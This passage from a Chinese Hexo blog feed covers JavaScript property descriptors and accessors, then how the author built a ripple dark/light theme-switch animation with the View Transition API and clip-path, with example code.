<span class="number">1</span>,</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们来想想，平时都是怎么描述一个对象的某个属性？</p><p>值为多少？可遍历？可重写？这些其实就是属性描述的一部分。那么，在代码表现上，怎么知道一个对象属性的描述？</p><p><code>JS</code> 在这方面提供的函数 <code>API</code> 是 <code>getOwnPropertyDescriptor</code>：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> desc = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">'a'</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(desc);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这将输出：{ value: 1, writable: true, enumerable: true, configurable: true }</span></span><br></pre></td></tr></tbody></table></figure><p>得到结果的是对象，它描述的就是对象 <code>obj</code> 的属性 <code>a</code>。这个对象内的属性，描述的意思都很简单：</p><ul><li><code>value</code>：属性值</li><li><code>writable</code>：属性是否可重写</li><li><code>enumerable</code>：属性是否可遍历</li><li><code>configurable</code>：属性描述是否可再次配置</li></ul><p>这就是说，对象的每一个属性都有一套属性描述符来描述。其中，第四个描述属性 <code>configurable</code> 决定了某个对象属性的属性描述符是否可以再次被配置。那么，如何配置一个属性的属性描述符呢？</p><p><code>JS</code> 提供的函数 <code>API</code> 是 <code>defineProperty</code>：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = {</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">}</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">'a'</span>, {</span><br><span class="line">  <span class="attr">value</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">writable</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">configurable</span>: <span class="literal">false</span>,</span><br><span class="line">})</span><br><span class="line">obj.<span class="property">a</span> = <span class="number">3</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">'a'</span>, {</span><br><span class="line">  <span class="attr">value</span>: <span class="number">4</span>,</span><br><span class="line">})</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'obj.a:'</span>, obj.<span class="property">a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这将报错：TypeError: Cannot redefine property: a</span></span><br><span class="line"><span class="comment">// 如果不进行Object.defineProperty则输出：obj.a: 3</span></span><br></pre></td></tr></tbody></table></figure><p>当我们将 <code>configurable</code> 设为 <code>false</code> 之后，就无论如何都无法更改某个属性的属性描述符，更改则触发报错。</p><div class="note warning flat"><p>只有 <code>configurable</code> 会触发报错，其他属性描述符若存在冲突，不会触发任何显式提示</p></div><p>这时，我们回过头来看引入部分的场景，我们是不是可以对原始数据进行 "上锁" 了？</p><h3 id="访问器"><a class="markdownIt-Anchor" href="#访问器"></a> 访问器</h3><p><strong>预期</strong>：原始数据无法被更改，并且在数据操作和我的预期有冲突时，"显式的提示" 给编程人员。</p><p>为了实现预期效果，上面的四个属性描述符是不够的，还需要认识两个属性描述符的配置：<code>get()</code> 和 <code>set()</code>，示例如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">'b'</span>, {</span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>) {}, <span class="comment">// 读取器 getter</span></span><br><span class="line">  <span class="title function_">set</span>(<span class="params"></span>) {}, <span class="comment">// 设置器 setter</span></span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p><code>get()</code> 和 <code>set()</code> 整体称为访问器。</p><p>一旦设置了 <code>get()</code>，那么将来读取这个被设置了属性描述符的属性时，就不再会去内存中寻找，而是直接运行 <code>get()</code> 函数。也就是说，<code>console.log(obj.a)</code> 等效于 <code>console.log(get())</code>，打印的就是 <code>get()</code> 函数的运行结果。例如：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">'b'</span>, {</span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'aHa'</span>;</span><br><span class="line">  }, <span class="comment">// 读取器 getter</span></span><br><span class="line">  <span class="title function_">set</span>(<span class="params"></span>) {}, <span class="comment">// 设置器 setter</span></span><br><span class="line">})</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'obj.b:'</span>, obj.<span class="property">b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这将输出：obj.b: aHa</span></span><br></pre></td></tr></tbody></table></figure><p>对于 <code>set()</code> 也是如此，当赋值发生时，逻辑变成直接运行 <code>set()</code> 函数。例如：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tempVal = <span class="literal">undefined</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(obj, <span class="string">'b'</span>, {</span><br><span class="line">  <span class="title function_">get</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> tempVal;</span><br><span class="line">  }, <span class="comment">// 读取器 getter</span></span><br><span class="line">  <span class="title function_">set</span>(<span class="params">val</span>) {</span><br><span class="line">    tempVal = val;</span><br><span class="line">  }, <span class="comment">// 设置器 setter</span></span><br><span class="line">})</span><br><span class="line">obj.<span class="property">b</span> = <span class="string">'vamos'</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'obj.b:'</span>, obj.<span class="property">b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这将输出：obj.b: vamos</span></span><br></pre></td></tr></tbody></table></figure><p>于是，借助 <code>get()</code> 和 <code>set()</code> 就可以实现我们的预期效果了：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原始对象数据</span></span><br><span class="line"><span class="keyword">const</span> goods = {</span><br><span class="line">  <span class="attr">pic</span>: <span class="string">'/img/1.webp'</span>,</span><br><span class="line">  <span class="attr">title</span>: <span class="string">'simple title'</span>,</span><br><span class="line">  <span class="attr">desc</span>: <span class="string">'simple desc'</span>,</span><br><span class="line">  <span class="attr">sellNumber</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">favorRate</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">price</span>: <span class="number">20</span>,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span> {</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">goods</span>) {</span><br><span class="line">    goods = { ...goods }</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">freeze</span>(goods) <span class="comment">// 冻结对象，防止修改</span></span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>, <span class="string">'data'</span>, {</span><br><span class="line">      <span class="attr">configurable</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">return</span> goods;</span><br><span class="line">      },</span><br><span class="line">      <span class="title function_">set</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">'data 属性只读，不可修改'</span>);</span><br><span class="line">      },</span><br><span class="line">    })</span><br><span class="line">    <span class="keyword">let</span> internalData = <span class="number">0</span>;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>, <span class="string">'chooseNum'</span>, {</span><br><span class="line">      <span class="attr">configurable</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">return</span> internalData;</span><br><span class="line">      },</span><br><span class="line">      <span class="title function_">set</span>(<span class="params">val</span>) {</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> val !== <span class="string">'number'</span>) {</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">'chooseNum 属性必须是数字'</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (val &lt; <span class="number">0</span>) {</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">'chooseNum 属性必须是大于等于0的数字'</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">let</span> tempNum = <span class="built_in">parseInt</span>(val)</span><br><span class="line">        <span class="keyword">if</span> (tempNum !== val) {</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">'chooseNum 属性必须是整数'</span>);</span><br><span class="line">        }</span><br><span class="line">        internalData = val;</span><br><span class="line">      }</span><br><span class="line">    })</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(<span class="variable language_">this</span>, <span class="string">'totalPrice'</span>, {</span><br><span class="line">      <span class="attr">configurable</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="title function_">get</span>(<span class="params"></span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">price</span> * <span class="variable language_">this</span>.<span class="property">chooseNum</span>;</span><br><span class="line">      }</span><br><span class="line">    })</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">example</span> = <span class="string">'example'</span>;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">seal</span>(<span class="variable language_">this</span>); <span class="comment">// 密封对象，防止添加新属性，但可以修改已有属性</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">const</span> g = <span class="keyword">new</span> <span class="title class_">Goods</span>(goods);</span><br><span class="line">g.<span class="property">data</span>.<span class="property">favorRate</span> = <span class="number">99</span>; <span class="comment">// 无法修改属性</span></span><br><span class="line">g.<span class="property">chooseNum</span> = <span class="number">2</span>; <span class="comment">// 修改 chooseNum 属性</span></span><br><span class="line">g.<span class="property">ak</span> = <span class="number">100</span>; <span class="comment">// 无法添加新属性</span></span><br><span class="line">g.<span class="property">example</span> = <span class="string">'new example'</span>; <span class="comment">// 可以修改属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'g.data: '</span>, g.<span class="property">data</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'g.chooseNum: '</span>, g.<span class="property">chooseNum</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'g.totalPrice: '</span>, g.<span class="property">totalPrice</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'g.ak: '</span>, g.<span class="property">ak</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'g.example: '</span>, g.<span class="property">example</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出结果：</span></span><br><span class="line"><span class="comment"> * g.data:  {</span></span><br><span class="line"><span class="comment"> *   pic: '/img/1.webp',</span></span><br><span class="line"><span class="comment"> *   title: 'simple title',</span></span><br><span class="line"><span class="comment"> *   desc: 'simple desc',</span></span><br><span class="line"><span class="comment"> *   sellNumber: 1,</span></span><br><span class="line"><span class="comment"> *   favorRate: 20,</span></span><br><span class="line"><span class="comment"> *   price: 20</span></span><br><span class="line"><span class="comment"> * }</span></span><br><span class="line"><span class="comment"> * g.chooseNum:  2</span></span><br><span class="line"><span class="comment"> * g.totalPrice:  40</span></span><br><span class="line"><span class="comment"> * g.ak:  undefined</span></span><br><span class="line"><span class="comment"> * g.example:  new example</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 属性描述符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js+css 实现 Hexo 博客 ripple 水波切换主题效果</title>
      <link href="/posts/9104.html"/>
      <url>/posts/9104.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>之前在使用 b 站的时候总是觉得不好用，于是四处寻找脚本、扩展优化 b 站的浏览体验（<s>优化摸鱼体验</s>）。其中，有一个叫 <code>BewlyBewly</code> 的扩展比较大幅度的更改了 b 站的 ui 设计（不过目前这个扩展在 GitHub 上已不再维护），它的一个切换主题效果就是 ripple 水波扩散式的切换动画，虽然以前在 Element-Plus 官方文档页也看到过，但是没时间没想法只想躺平，所以没做。今天就来将它应用到博客上。</p><h2 id="预览"><a class="markdownIt-Anchor" href="#预览"></a> 预览</h2><table><thead><tr><th>切换方向</th><th>动画目标</th><th>裁剪方向</th><th>视觉效果</th></tr></thead><tbody><tr><td> light→dark</td><td> 上层 light 快照</td><td>扩展→收缩</td><td> light 样式从点击处向内收缩消失</td></tr><tr><td> dark→light</td><td> 下层 light 快照</td><td>收缩→扩展</td><td> light 样式从点击处向外扩展显现</td></tr></tbody></table><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221132415.gif" alt="PixPin_2025-07-22_11-31-17"></p><h2 id="view-transition-api"><a class="markdownIt-Anchor" href="#view-transition-api"></a> View Transition API</h2><p>ripple 水波动画使用到的 API 为 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/View_Transition_API">View Transition API</a>，再加上一点 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/clip-path">clip-path</a> 裁剪效果就可以做到。</p><h2 id="兼容性"><a class="markdownIt-Anchor" href="#兼容性"></a> 兼容性</h2><p>目前（截止至 2025-07-22），<code>View Transition API</code> 兼容性如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221122709.png" alt="image-20250722112251679"></p><h2 id="动画原理"><a class="markdownIt-Anchor" href="#动画原理"></a> 动画原理</h2><p>在介绍中可以看到，<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/View_Transition_API">View Transition API</a> 在更新 DOM 的同时，会创建不同 DOM 状态的快照：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221135967.png" alt="image-20250722113519927"></p><p>在不进行命名的情况下，我们能得到默认（root）的一组伪元素：</p><ol><li><code>::view-transition-old(root)</code></li><li><code>::view-transition-new(root)</code></li></ol><p>注意该组快照的层级关系，旧的未发生 DOM 改变的状态快照在新的快照上方。</p><p>现在，我们有了两张前后快照，再想到 clip-path 裁剪效果，动画原理已经很明朗了。</p><h3 id="light转dark示例代码"><a class="markdownIt-Anchor" href="#light转dark示例代码"></a> Light 转 Dark 示例代码</h3><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当切换到暗色主题时，isDark = true</span></span><br><span class="line"><span class="keyword">const</span> isDark = newTheme === <span class="string">"dark"</span>;</span><br><span class="line"><span class="comment">// 得到鼠标点击位置clientX和clientY计算具体效果呈现</span></span><br><span class="line"><span class="keyword">const</span> clipPath = [</span><br><span class="line">  <span class="string">`circle(0% at <span class="subst">${clientX}</span>px <span class="subst">${clientY}</span>px)`</span>,      <span class="comment">// 起始：圆形裁剪区域为0</span></span><br><span class="line">  <span class="string">`circle(<span class="subst">${radius}</span>px at <span class="subst">${clientX}</span>px <span class="subst">${clientY}</span>px)`</span> <span class="comment">// 结束：圆形扩展到全屏</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">animate</span>({</span><br><span class="line">  <span class="attr">clipPath</span>: isDark ? clipPath.<span class="title function_">reverse</span>() : clipPath, <span class="comment">// 暗色时反向</span></span><br><span class="line">}, {</span><br><span class="line">  <span class="attr">pseudoElement</span>: isDark </span><br><span class="line">    ? <span class="string">"::view-transition-old(root)"</span>  <span class="comment">// 暗色：动画作用于旧快照（亮色快照）</span></span><br><span class="line">    : <span class="string">"::view-transition-new(root)"</span>  <span class="comment">// 亮色：动画作用于新快照（暗色快照）</span></span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p><strong>执行流程</strong>：</p><ol><li><strong>快照层级</strong>：<code>::view-transition-old(root)</code>（亮色）在 <code>::view-transition-new(root)</code>（暗色）<strong>上方</strong></li><li><strong>动画目标</strong>：对<strong>上层的亮色快照</strong>应用 clip-path 动画</li><li><strong>裁剪方向</strong>：<code>clipPath.reverse()</code> → 从 <code>circle(${radius}px...)</code> 到 <code>circle(0%...)</code></li><li><strong>视觉效果</strong>：亮色快照从鼠标点击位置开始<strong>收缩消失</strong>，逐渐露出下方的暗色快照</li><li><strong>最终结果</strong>：亮色完全消失，暗色主题显现</li></ol><p><code>Dark</code> 转 <code>Light</code> 依靠 <code>isDark</code> 和<code>.reverse()</code> 就能快捷的实现相反的动画效果。</p><h2 id="注入js"><a class="markdownIt-Anchor" href="#注入js"></a> 注入 js</h2><p>以主题 Butterfly 为例，只需要在<code>_config.butterfly.yml</code> 的 <code>inject</code> 区域进行注入即可。</p><p>我的 <code>ripple-toggle.js</code> 代码如下：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: 4rozeN</span></span><br><span class="line"><span class="comment"> * Date：2025-07-21 10:52:40</span></span><br><span class="line"><span class="comment"> * LastEditTime: 2025-07-21 20:25:39</span></span><br><span class="line"><span class="comment"> * LastEditors: 4rozeN</span></span><br><span class="line"><span class="comment"> * Description：优化切换主题动画。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getCurrentTheme</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">getAttribute</span>(<span class="string">"data-theme"</span>) || <span class="string">"light"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">setTheme</span> = (<span class="params">theme</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">setAttribute</span>(<span class="string">"data-theme"</span>, theme);</span><br><span class="line">  <span class="keyword">const</span> expiry = <span class="title class_">Date</span>.<span class="title function_">now</span>() + <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>;</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">"theme"</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">value</span>: theme, expiry }));</span><br><span class="line">};</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isMobile</span> = (<span class="params"></span>) =&gt;</span><br><span class="line">  <span class="regexp">/Android|iPhone|iPad|iPod|Windows Phone|Mobile|iOS/i</span>.<span class="title function_">test</span>(</span><br><span class="line">    navigator.<span class="property">userAgent</span></span><br><span class="line">  );</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">rippleToggle</span> = (<span class="params">e, point</span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> currentTheme = <span class="title function_">getCurrentTheme</span>();</span><br><span class="line">  <span class="keyword">const</span> newTheme = currentTheme === <span class="string">"dark"</span> ? <span class="string">"light"</span> : <span class="string">"dark"</span>;</span><br><span class="line">  <span class="comment">// 如果是移动设备，直接切换，不用动画</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">isMobile</span>()) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"mobile设备跳过动画"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查浏览器支持</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">document</span>.<span class="property">startViewTransition</span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"浏览器限制，直接切换主题"</span>);</span><br><span class="line">    <span class="keyword">if</span> (e?.<span class="property">stopImmediatePropagation</span>) {</span><br><span class="line">      e.<span class="title function_">stopImmediatePropagation</span>(); <span class="comment">// 阻止同一元素上其他监听器执行</span></span><br><span class="line">    }</span><br><span class="line">    <span class="title function_">setTheme</span>(newTheme);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (e?.<span class="property">stopImmediatePropagation</span>) {</span><br><span class="line">    e.<span class="title function_">stopImmediatePropagation</span>(); <span class="comment">// 阻止同一元素上其他监听器执行</span></span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> transition = <span class="variable language_">document</span>.<span class="title function_">startViewTransition</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="title function_">requestAnimationFrame</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">      <span class="title function_">setTheme</span>(newTheme);</span><br><span class="line">    });</span><br><span class="line">  });</span><br><span class="line">  transition.<span class="property">ready</span>.<span class="title function_">then</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> { clientX, clientY } = point || e;</span><br><span class="line">    <span class="comment">// console.log(`clientX: ${clientX} | clientY: ${clientY}`, e, point);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> radius = <span class="title class_">Math</span>.<span class="title function_">hypot</span>(</span><br><span class="line">      <span class="title class_">Math</span>.<span class="title function_">max</span>(clientX, innerWidth - clientX),</span><br><span class="line">      <span class="title class_">Math</span>.<span class="title function_">max</span>(clientY, innerHeight - clientY)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">const</span> clipPath = [</span><br><span class="line">      <span class="string">`circle(0% at <span class="subst">${clientX}</span>px <span class="subst">${clientY}</span>px)`</span>,</span><br><span class="line">      <span class="string">`circle(<span class="subst">${radius}</span>px at <span class="subst">${clientX}</span>px <span class="subst">${clientY}</span>px)`</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">const</span> isDark = newTheme === <span class="string">"dark"</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="title function_">animate</span>(</span><br><span class="line">      {</span><br><span class="line">        <span class="attr">clipPath</span>: isDark ? clipPath.<span class="title function_">reverse</span>() : clipPath,</span><br><span class="line">      },</span><br><span class="line">      {</span><br><span class="line">        <span class="attr">duration</span>: <span class="number">300</span>,</span><br><span class="line">        <span class="attr">easing</span>: <span class="string">"ease-out"</span>,</span><br><span class="line">        <span class="attr">pseudoElement</span>: isDark</span><br><span class="line">          ? <span class="string">"::view-transition-old(root)"</span></span><br><span class="line">          : <span class="string">"::view-transition-new(root)"</span>,</span><br><span class="line">      }</span><br><span class="line">    );</span><br><span class="line">  });</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">bindRippleThemeToggle</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"darkmode"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!btn) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"找不到对应的切换按钮元素"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">  btn.<span class="title function_">removeEventListener</span>(<span class="string">"click"</span>, rippleToggle);</span><br><span class="line">  btn.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, rippleToggle);</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">[<span class="string">"DOMContentLoaded"</span>, <span class="string">"pjax:complete"</span>].<span class="title function_">forEach</span>(<span class="function">(<span class="params">evt</span>) =&gt;</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(evt, 